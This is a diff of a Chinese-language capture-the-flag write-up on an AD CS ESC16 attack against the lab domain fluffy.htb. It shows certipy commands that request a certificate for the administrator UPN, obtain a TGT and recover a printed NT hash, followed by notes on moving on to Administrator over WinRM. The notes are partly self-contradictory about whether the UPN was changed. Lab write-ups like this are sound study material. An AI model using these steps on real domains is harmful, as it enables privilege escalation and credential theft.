@@ -450,10 +450,45 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
     servicePrincipalName                : ADCS/ca.fluffy.htb
 //没有看到 userPrincipalName为ca_svc@fluffy.htb
 ```
-#### certipy find 是否成功，取决于：
 ```
-1️⃣ 能不能连到 DC（IP / 389 / 445）
-2️⃣ 凭据是否有效
-[★]$ nc -zv 10.129.60.35 445
-fluffy.htb [10.129.60.35] 445 (microsoft-ds) open
+#certipy req \
+> -u ca_svc \
+> -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
+> -dc-ip 10.129.62.52 \
+> -target dc01.fluffy.htb \
+> -ca 'fluffy-DC01-CA' \
+> -template User \
+> -upn administrator@fluffy.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 18
+[*] Got certificate with UPN 'ca_svc@fluffy.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'ca_svc.pfx'
 ```
+#### 用刚拿到的 ca_svc.pfx 去请求 TGT（尝试以证书身份登录）
+```
+#certipy auth -pfx ca_svc.pfx -dc-ip 10.129.62.52
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: ca_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+#### 以 ca_svc 身份完成 PKINIT 登录
+#### ESC16（No Security Extensions / No SID Enforcement）：CA 不验证证书里的“身份声明”是否和 AD 对象匹配
+```
+也就是说：
+
+👉 你不需要改 ca_svc 的 UPN
+👉 你需要“再次请求证书”，并让证书声明自己是 Administrator
+```
+#### 然后，应该以ca svc用户的身份请求证书。由于ca sv c用户的UPN已更新对于管理员，生成的证书将允许我们以管理员用户身份进行身份验证。请注意此处使用的User模板（CA中的默认模板）。
+#### 这将为Administrator用户保存证书。可以。在使用这个之前ca_svc用户修改后的UPN需要更新为正确的UPN。
+#### 最后，让我们使用管理员。获取Administrator用户的RC4哈希值。
+#### 使用这个RC4哈希，我们可以通过WinRM作为Administrator用户访问目标。
